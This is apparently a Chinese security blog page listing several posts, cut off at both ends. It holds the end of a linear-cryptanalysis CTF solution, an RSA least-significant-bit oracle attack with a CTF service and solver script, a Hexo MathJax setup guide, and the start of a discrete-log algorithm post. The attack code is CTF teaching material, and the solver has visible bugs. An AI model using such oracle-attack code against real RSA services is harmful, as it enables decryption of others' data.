class="number">214</span>, <span class="number">35</span>, <span class="number">25</span>, <span class="number">42</span>, <span class="number">6</span>, <span class="number">223</span>, <span class="number">230</span>, <span class="number">132</span>, <span class="number">65</span>, <span class="number">235</span>, <span class="number">117</span>, <span class="number">209</span>, <span class="number">53</span>, <span class="number">24</span>, <span class="number">169</span>, <span class="number">28</span>, <span class="number">171</span>, <span class="number">69</span>, <span class="number">99</span>, <span class="number">102</span>, <span class="number">184</span>, <span class="number">239</span>, <span class="number">215</span>, <span class="number">130</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">100</span>, <span class="number">155</span>, <span class="number">44</span>, <span class="number">7</span>, <span class="number">165</span>, <span class="number">174</span>, <span class="number">59</span>, <span class="number">176</span>, <span class="number">118</span>, <span class="number">193</span>, <span class="number">76</span>, <span class="number">123</span>, <span class="number">12</span>, <span class="number">125</span>, <span class="number">63</span>, <span class="number">231</span>, <span class="number">80</span>, <span class="number">37</span>, <span class="number">88</span>, <span class="number">74</span>, <span class="number">122</span>, <span class="number">97</span>, <span class="number">95</span>, <span class="number">49</span>, <span class="number">200</span>, <span class="number">60</span>, <span class="number">144</span>, <span class="number">108</span>, <span class="number">219</span>, <span class="number">197</span>, <span class="number">187</span>, <span class="number">89</span>, <span class="number">17</span>, <span class="number">131</span>, <span class="number">52</span>, <span class="number">236</span>, <span class="number">120</span>, <span class="number">51</span>, <span class="number">18</span>, <span class="number">217</span>, <span class="number">110</span>, <span class="number">67</span>, <span class="number">13</span>, <span class="number">183</span>, <span class="number">136</span>, <span class="number">180</span>, <span class="number">39</span>, <span class="number">255</span>, <span class="number">179</span>, <span class="number">61</span>, <span class="number">181</span>, <span class="number">218</span>, <span class="number">240</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">103</span>, <span class="number">163</span>, <span class="number">27</span>, <span class="number">172</span>, <span class="number">116</span>, <span class="number">212</span>, <span class="number">46</span>, <span class="number">153</span>, <span class="number">129</span>, <span class="number">246</span>, <span class="number">192</span>, <span class="number">243</span>, <span class="number">175</span>, <span class="number">146</span>, <span class="number">105</span>, <span class="number">66</span>, <span class="number">154</span>, <span class="number">248</span>, <span class="number">106</span>, <span class="number">81</span>, <span class="number">137</span>, <span class="number">62</span>, <span class="number">34</span>, <span class="number">226</span>, <span class="number">188</span>, <span class="number">11</span>, <span class="number">126</span>, <span class="number">201</span>, <span class="number">167</span>, <span class="number">166</span>, <span class="number">75</span>, <span class="number">247</span>, <span class="number">36</span>, <span class="number">147</span>, <span class="number">10</span>, <span class="number">251</span>, <span class="number">55</span>, <span class="number">128</span>, <span class="number">253</span>, <span class="number">82</span>, <span class="number">16</span>, <span class="number">138</span>, <span class="number">72</span>, <span class="number">111</span>, <span class="number">92</span>, <span class="number">85</span>, <span class="number">158</span>, <span class="number">90</span>, <span class="number">21</span>, <span class="number">190</span>, <span class="number">254</span>, <span class="number">73</span>, <span class="number">145</span>, <span class="number">101</span>, <span class="number">203</span>, <span class="number">124</span>, <span class="number">164</span>, <span class="number">19</span>, <span class="number">56</span>, <span class="number">70</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">83</span>, <span class="number">228</span>, <span class="number">30</span>, <span class="number">139</span>, <span class="number">64</span>, <span class="number">31</span>, <span class="number">47</span>, <span class="number">152</span>, <span class="number">202</span>, <span class="number">194</span>, <span class="number">26</span>, <span class="number">20</span>, <span class="number">195</span>, <span class="number">196</span>, <span class="number">241</span>, <span class="number">2</span>, <span class="number">225</span>, <span class="number">54</span>, <span class="number">142</span>, <span class="number">57</span>, <span class="number">242</span>, <span class="number">119</span>, <span class="number">157</span>, <span class="number">177</span>, <span class="number">199</span>, <span class="number">112</span>, <span class="number">168</span>, <span class="number">206</span>, <span class="number">227</span>, <span class="number">221</span>, <span class="number">5</span>, <span class="number">178</span>, <span class="number">238</span>, <span class="number">232</span>, <span class="number">48</span>, <span class="number">135</span>, <span class="number">233</span>, <span class="number">96</span>, <span class="number">208</span>, <span class="number">148</span>, <span class="number">121</span>, <span class="number">109</span>, <span class="number">162</span>, <span class="number">161</span>, <span class="number">204</span>, <span class="number">33</span>, <span class="number">205</span>, <span class="number">244</span>, <span class="number">249</span>, <span class="number">78</span>, <span class="number">150</span>, <span class="number">87</span>, <span class="number">234</span>, <span class="number">93</span>, <span class="number">133</span>, <span class="number">50</span>, <span class="number">45</span>, <span class="number">104</span>, <span class="number">189</span>, <span class="number">173</span>, <span class="number">185</span>, <span class="number">86</span>, <span class="number">29</span>, <span class="number">170</span>, <span class="number">71</span>, <span class="number">229</span>, <span class="number">40</span>, <span class="number">159</span>, <span class="number">84</span>, <span class="number">245</span>, <span class="number">252</span>, <span class="number">140</span>, <span class="number">41</span>, <span class="number">58</span>, <span class="number">14</span>, <span class="number">114</span>&#125;;</div><div class="line"><span class="keyword">int</span> cnt[<span class="number">256</span>][<span class="number">256</span>];</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">bit</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> k)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">return</span> (n &amp; (<span class="number">1</span> &lt;&lt; k)) != <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">auto</span> f = fopen(<span class="string">"data"</span>, <span class="string">"rb"</span>);</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">65536</span>; i++) &#123;</div><div class="line">        <span class="keyword">uint8_t</span> p[<span class="number">8</span>], c[<span class="number">8</span>];</div><div class="line">        fread(&amp;p, <span class="number">8</span>, <span class="number">1</span>, f);</div><div class="line">        fread(&amp;c, <span class="number">8</span>, <span class="number">1</span>, f);</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> a = <span class="number">0</span>; a &lt; <span class="number">256</span>; a++) &#123;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> b = <span class="number">0</span>; b &lt; <span class="number">256</span>; b++) &#123;</div><div class="line">                <span class="keyword">int</span> u4b0 = sbox_inv[(<span class="keyword">int</span>)c[<span class="number">0</span>] ^ a], u4b6 = sbox_inv[(<span class="keyword">int</span>)c[<span class="number">6</span>] ^ b];</div><div class="line">                <span class="keyword">if</span> (bit(p[<span class="number">0</span>], <span class="number">0</span>) ^ bit(p[<span class="number">0</span>], <span class="number">3</span>) ^ bit(p[<span class="number">0</span>], <span class="number">4</span>) ^ bit(u4b0, <span class="number">0</span>) ^ bit(u4b0, <span class="number">4</span>)</div><div class="line">                  ^ bit(u4b6, <span class="number">0</span>) ^ bit(u4b6, <span class="number">4</span>)) &#123;</div><div class="line">                    cnt[a][b]++;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> a = <span class="number">0</span>; a &lt; <span class="number">256</span>; a++) &#123;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> b = <span class="number">0</span>; b &lt; <span class="number">256</span>; b++) &#123;</div><div class="line">            <span class="keyword">int</span> bias = <span class="built_in">abs</span>(cnt[a][b] - <span class="number">32768</span>);</div><div class="line">            <span class="keyword">if</span> (bias &gt; <span class="number">1000</span>)</div><div class="line">                <span class="built_in">cout</span> &lt;&lt; a &lt;&lt; <span class="string">" "</span> &lt;&lt; b &lt;&lt; <span class="string">" "</span> &lt;&lt; bias &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>结果为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">130 103 1068</div><div class="line">130 118 1044</div><div class="line">130 194 2220</div><div class="line">130 196 1111</div><div class="line">130 213 1068</div><div class="line">149 194 1045</div></pre></td></tr></table></figure>
<p>于是我们可以认为最后1轮中，第0字节为130，第6个字节是194。</p>
<p>当然我们可用类似的办法求出另外一些字节：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">def inv(rnd, r5):</div><div class="line">    r4b = bytearray(r5[i]^r5[4+i] for i in xrange(4))</div><div class="line">    r4a = bytearray(r5[i]^sbox[r4b[(i+1)%4]] ^ (rcon[rnd] if i == 0 else 0) for i in xrange(4))</div><div class="line">    return r4a + r4b</div><div class="line"></div><div class="line">r5 = bytearray([130, 167, 150, 65, 235, 239, 194, 40])</div><div class="line">r4 = inv(4, r5)</div><div class="line">r3 = inv(3, r4)</div><div class="line">r2 = inv(2, r3)</div><div class="line">r1 = inv(1, r2)</div><div class="line">print &apos;flag&#123;%s&#125;&apos;%(str(r1).encode(&apos;hex&apos;))</div></pre></td></tr></table></figure>
<p>最终的flag为flag{48667ec1a5fb3383}</p>
<h3 id="0x05-引用"><a href="#0x05-引用" class="headerlink" title="0x05 引用"></a>0x05 引用</h3><p><a href="https://www.engr.mun.ca/~howard/PAPERS/ldc_tutorial.pdf" target="_blank" rel="external">https://www.engr.mun.ca/~howard/PAPERS/ldc_tutorial.pdf</a></p>
<p><a href="https://gist.github.com/ngg/f534e51c14a832d69c41289837078773" target="_blank" rel="external">https://gist.github.com/ngg/f534e51c14a832d69c41289837078773</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/27/RSA-Least-Significant-Bit-Oracle-Attack/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/03/27/RSA-Least-Significant-Bit-Oracle-Attack/" itemprop="url">RSA Least-Significant-Bit Oracle Attack</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-27T17:18:35+08:00">
                2018-03-27
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/crypto/" itemprop="url" rel="index">
                    <span itemprop="name">crypto</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>此攻击方式是从<a href="https://crypto.stackexchange.com/questions/11053/rsa-least-significant-bit-oracle-attack" target="_blank" rel="external">rsa-least-significant-bit-oracle-attack</a> 看到的，刚好用于Backdoor CTF的一道密码学的题目！</p>
<h3 id="0x1-问题描述"><a href="#0x1-问题描述" class="headerlink" title="0x1 问题描述"></a>0x1 问题描述</h3><p>假如用户知道公钥中$N,e,c$，并且可以任意构造密文$c_1$，返回此密文解密后$p_1$的末尾某些比特位的性质（记为函数$f$），求原始明文信息！</p>
<p>最简单的函数$f$ 是表示 $p_1$ 的奇偶性。</p>
<h3 id="0x2-原理"><a href="#0x2-原理" class="headerlink" title="0x2 原理"></a>0x2 原理</h3><p>攻击者得到密文$C=P^e(mod\ n)$ ，将其乘以$2^e(mod\ N)$, 并作为密文发送出去，若返回$f(2P)$</p>
<blockquote>
<p>如果$f(2P)$ 返回的最后一位是0，那么$2P&lt;N$，即$P&lt;N/2$</p>
<p>如果$f(2P)$ 返回的最后一位是1，那么$2P&gt;N$，即 $P&gt;N/2$</p>
</blockquote>
<p>接着我们来看看$2P$ 和 $4P$</p>
<blockquote>
<p>如果返回的是（偶，偶），那么有 $P&lt;N/4$</p>
<p>如果返回的是（偶，奇），那么有$N/4&lt;P&lt;N/2$</p>
<p>如果返回的是（偶，奇），那么有$N/2&lt;P&lt;3N/4$</p>
<p>如果返回的是（奇，奇），那么有$3N/4&lt;P&lt;N$</p>
</blockquote>
<p>从这里基本上就可以找到规律了，如果我们循环下去，基本上就可以得到P所处在的空间。当次数不断叠加，最终所处在的空间将会十分的小，于是就可以解出对应的解！</p>
<h3 id="0x3-方法"><a href="#0x3-方法" class="headerlink" title="0x3 方法"></a>0x3 方法</h3><p>$P\in[0,P]$ 也即$LB=0$， $UB=N$</p>
<p>使用$log_2\ N$ 次可以根据密文$C$ 求解出明文$P$</p>
<p>$C&#39;=(2^e\ mod\ N)*C$</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">if (Oracle(C&apos;) == even)</div><div class="line">    UB = (UB + LB)/2;</div><div class="line">else</div><div class="line">    LB = (UB + LB)/2;</div></pre></td></tr></table></figure>
<h3 id="0x4-实例"><a href="#0x4-实例" class="headerlink" title="0x4 实例"></a>0x4 实例</h3><p>Backdoor CTF 2018 题目 BIT-LEAKER</p>
<p>service.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python -u</span></div><div class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</div><div class="line"><span class="keyword">import</span> random</div><div class="line"><span class="comment">#from SECRET import flag</span></div><div class="line">flag = <span class="string">"CTF&#123;this_is_my_test_flag&#125;"</span></div><div class="line">m = bytes_to_long(flag)</div><div class="line"></div><div class="line">key = RSA.generate(<span class="number">1024</span>)</div><div class="line"></div><div class="line">c = pow(m, key.e, key.n)</div><div class="line">print(<span class="string">"Welcome to BACKDOORCTF17\n"</span>)</div><div class="line">print(<span class="string">"PublicKey:\n"</span>)</div><div class="line">print(<span class="string">"N = "</span> + str(key.n) + <span class="string">"\n"</span>)</div><div class="line">print(<span class="string">"e = "</span> + str(key.e) + <span class="string">"\n"</span>)</div><div class="line">print(<span class="string">"c = "</span> + str(c) + <span class="string">"\n"</span>)</div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        temp_c = int(raw_input(<span class="string">"temp_c = "</span>))</div><div class="line">        temp_m = pow(temp_c, key.d, key.n)</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">break</span></div><div class="line">    l = str(((temp_m&amp;<span class="number">5</span>) * random.randint(<span class="number">1</span>,<span class="number">10000</span>))%(<span class="number">2</span>*(random.randint(<span class="number">1</span>,<span class="number">10000</span>))))</div><div class="line">    <span class="keyword">print</span> <span class="string">"l = "</span>+l</div></pre></td></tr></table></figure>
<p>solve.py</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div></pre></td><td class="code"><pre><div class="line"># -*- coding: utf-8 -*-</div><div class="line">#/usr/bin/env python</div><div class="line"></div><div class="line">from pwn import *</div><div class="line">import libnum</div><div class="line">import Crypto</div><div class="line">import re</div><div class="line">from binascii import hexlify,unhexlify</div><div class="line"></div><div class="line">if len(sys.argv)&gt;1:</div><div class="line">    p=remote(&quot;127.0.0.1&quot;,2334)</div><div class="line">else:</div><div class="line">    p=remote(&apos;127.0.0.1&apos;,2333)</div><div class="line"></div><div class="line">#context.log_level = &apos;debug&apos;</div><div class="line"></div><div class="line">def oracle(c):</div><div class="line">    l = []</div><div class="line">    for i in range(20):</div><div class="line">        p.sendline(str(c))</div><div class="line">        s = p.recvuntil(&quot;temp_c&quot;)</div><div class="line">        l.append(int(re.findall(&quot;l\s*=\s*([0-9]*)&quot;,s)[0]))</div><div class="line">    flag0 = 0</div><div class="line">    flag2 = 0</div><div class="line">    for i in range(20):</div><div class="line">        if l[i]%2 != 0:</div><div class="line">            flag0 = 1</div><div class="line">        if l[i] &gt; 10000:</div><div class="line">            flag2 = 1</div><div class="line">    return [flag2,flag0]</div><div class="line"></div><div class="line"></div><div class="line">def main():</div><div class="line">    ss = p.recvuntil(&quot;temp_c&quot;)</div><div class="line">    N = int(re.findall(&quot;N\s*=\s*(\d+)&quot;,ss)[0])</div><div class="line">    e = int(re.findall(&quot;e\s*=\s*(\d+)&quot;,ss)[0])</div><div class="line">    c = int(re.findall(&quot;c\s*=\s*(\d+)&quot;,ss)[0])</div><div class="line">    size = libnum.len_in_bits(N)</div><div class="line">    print &quot;N=&quot;,N</div><div class="line">    print &quot;e=&quot;,e</div><div class="line">    print &quot;c=&quot;,c</div><div class="line">    c = (pow(2,e,N)*c)%N</div><div class="line">    LB = 0</div><div class="line">    UB = N</div><div class="line">    i = 1</div><div class="line">    while LB!=UB:</div><div class="line">        flag = oracle(c)</div><div class="line">        print i,flag</div><div class="line">        if flag[1]%2==0:</div><div class="line">            UB = (LB+UB)/2</div><div class="line">        else:</div><div class="line">            LB = (LB+UB)/2</div><div class="line">        c = (pow(2,e,N)*c)%N</div><div class="line">        i += 1</div><div class="line">    print LB</div><div class="line">    print UB</div><div class="line">    for i in range(-128,128,0):</div><div class="line">        LB += i</div><div class="line">        if pow(LB,e,N)==C:</div><div class="line">            print unhexlify(hex(LB)[2:-1])</div><div class="line">            exit(0)</div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    main()</div><div class="line">    p.interactive()</div></pre></td></tr></table></figure>
<p>这道题有个问题，就是远程比较慢，所以可能需要很长时间！</p>
<p>另外就是算法的正确度不能保证，所以可能需要中途断开，多跑几次！</p>
<p>还有就是这个算法因为都是整除运算，导致的最终结果可能有一定误差！</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/27/hexo使用hexo-math插件支持MathJax/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/03/27/hexo使用hexo-math插件支持MathJax/" itemprop="url">hexo使用hexo-math插件支持MathJax</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-27T11:57:57+08:00">
                2018-03-27
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Hexo搭建博客网站/" itemprop="url" rel="index">
                    <span itemprop="name">Hexo搭建博客网站</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>MathJax是使用LaTeX方式输入数学公式的好工具。Hexo虽然可以直接使用mathjax，但是存在一些不方便之处。使用<a href="https://github.com/akfish/hexo-math" target="_blank" rel="external">hexo-math</a>这个插件可以大大方便使用。<br>使用Hexo 3.2.0，主题NexT 5.0.1，hexo-math 3.0.0安装方式如下</p>
<p>在hexo安装目录下执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">npm install hexo-math --save</div></pre></td></tr></table></figure>
<p>然后编辑站点根目录下的<code>_config.yml</code>，添加</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">math:</div><div class="line">  engine: &apos;mathjax&apos; # or &apos;katex&apos;</div><div class="line">  mathjax:</div><div class="line">    src: custom_mathjax_source</div><div class="line">    config:</div><div class="line">      # MathJax config</div></pre></td></tr></table></figure>
<p>之后进入theme的目录，编辑主题的<code>_config.yml</code>，找到mathjax字段。NexT 5.0.1中默认mathjax是禁用，需要改成</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mathjax:</div><div class="line">   enable: true</div></pre></td></tr></table></figure>
<p>最后<code>hexo g</code>，就可以部署或者运行server查看效果了。</p>
<hr>
<p>几个测试例子<br>使用<code>$</code>的一行代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Simple inline $a = b + c$.</div></pre></td></tr></table></figure>
<p>Simple inline $a=b+c$.</p>
<p>使用<code>$$</code>的多行代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$$\frac&#123;\partial u&#125;&#123;\partial t&#125;</div><div class="line">= h^2 \left( \frac&#123;\partial^2 u&#125;&#123;\partial x^2&#125; +</div><div class="line">\frac&#123;\partial^2 u&#125;&#123;\partial y^2&#125; +</div><div class="line">\frac&#123;\partial^2 u&#125;&#123;\partial z^2&#125;\right)$$</div></pre></td></tr></table></figure>
<p>$$\frac{\partial u}{\partial t}= h^2 \left( \frac{\partial^2 u}{\partial x^2} +\frac{\partial^2 u}{\partial y^2} +\frac{\partial^2 u}{\partial z^2}\right)$$</p>
<p>使用Tag的块貌似不能用！！！</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">这儿讲了一些细节：首先是不能直接用\\来当换行符，需要用\newline</div><div class="line">另外编辑公式的时候，不要使用* &#123;% math %&#125; 双大括号 等容易发生冲突的符号</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$$</div><div class="line">\left[</div><div class="line">    \begin&#123;array&#125;&#123;cc|c&#125;</div><div class="line">      1&amp;2&amp;3\newline</div><div class="line">      4&amp;5&amp;6</div><div class="line">    \end&#123;array&#125;</div><div class="line">\right] </div><div class="line">$$</div></pre></td></tr></table></figure>
<p>$$<br>\left[<br>    \begin{array}{cc|c}<br>      1&amp;2&amp;3\newline<br>      4&amp;5&amp;6<br>    \end{array}<br>\right]<br>$$</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/26/常用于密码学中的算法/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/03/26/常用于密码学中的算法/" itemprop="url">常用于密码学中的算法</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-26T13:44:56+08:00">
                2018-03-26
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/crypto/" itemprop="url" rel="index">
                    <span itemprop="name">crypto</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h3><p>最近做了不少密码学的题目，对于常见的RSA密钥攻击已经非常熟悉，但是对于比较特殊的密码学攻击手段，我却不甚清楚。下面主要讲解的是几种常见的算法。</p>
<h3 id="0x1-baby-step-giant-step算法"><a href="#0x1-baby-step-giant-step算法" class="headerlink" title="0x1 baby step giant step算法"></a>0x1 baby step giant step算法</h3><p>baby step giant step算法常用于ACM竞赛中，该算法的目的是让$a^x=b(mod\ p)$ 求解的速度更快，核心是利用hash表查询的速度较普通查询方式快，当然同样是用空间换时间的一种思想。大概的时间复杂度$O(\sqrt{p}\ )$</p>
<p>设$m=\lceil\sqrt{p}\ \rceil$</p>
<p>那么可以设$x=i*m-j$</p>
<p>所以原式等价于 $a^{i*m-j}=b(mod\ p) $</p>
<p>也即 $(a^{m})^i=b*a^j$</p>
<p>枚举$j$ (从0-m)，将$b*a^j$ 存入hash表中</p>
<p>枚举i(范围1-m)，从hash表中寻找第一个满足$(a^{m})^i=b*a^j$ 的解</p>
<p>此时$x=i*m-j$</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span 